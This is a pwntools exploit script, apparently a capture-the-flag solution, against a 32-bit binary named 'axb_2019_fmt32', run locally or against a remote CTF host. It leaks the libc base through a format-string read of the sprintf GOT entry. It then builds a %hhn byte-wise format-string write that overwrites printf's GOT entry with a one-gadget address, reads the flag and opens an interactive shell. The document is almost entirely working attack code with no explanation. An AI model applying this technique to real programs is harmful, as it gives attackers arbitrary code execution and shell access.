import sys
from pwn import *
context.log_level='debug'
context.arch='i386'

def get_number(printed, target):
    print "[+] Target : %x" % (target)
    print "[+] printed number : %x" % (printed)
    if printed > target:
        return 256 - printed + target
    elif printed == target:
        return 0
    else:
        return target - printed

def write_memery(target, data, offset):
    lowest = data >> 8 * 3 & 0xFF
    low = data >> 8 * 2 & 0xFF
    high = data >> 8 * 1 & 0xFF
    highest = data >> 8 * 0 & 0xFF
    printed = 0
    payload = p32(target + 3) + p32(target + 2) + p32(target + 1) + p32(target + 0)
    length_lowest = get_number(len(payload), lowest)-12
    length_low = get_number(lowest, low)
    length_high = get_number(low, high)
    length_highest = get_number(high, highest)
    payload += '%' + str(length_lowest) + 'c' + '%' + str(offset) + '$hhn'
    payload += '%' + str(length_low) + 'c' + '%' + str(offset + 1) + '$hhn'
    payload += '%' + str(length_high) + 'c' + '%' + str(offset + 2) + '$hhn'
    payload += '%' + str(length_highest) + 'c' + '%' + str(offset + 3) + '$hhn'
    return payload
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./axb_2019_fmt32')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./axb_2019_fmt32')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',27865)
			elf=ELF('./axb_2019_fmt32')
			libc=ELF('../../i386libc/libc-2.23.so')

		io.recv()
		io.send('a'+p32(elf.got['sprintf'])+'%8$s')
		io.recv(14)
		libc_base=u32(io.recv()[:4])-libc.sym['sprintf']
		libc.address=libc_base
		#gdb.attach(io,'b *0x0804869b')
		pay='aaa'+write_memery(elf.got['printf'],libc_base+0x3a80e,75)+'\x00'
		io.send(pay)
		success('libc_base:'+hex(libc_base))
		success('system:'+hex(libc.sym['system']))

		io.send('cat flag\n')

		#gdb.attach(io)
		#pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue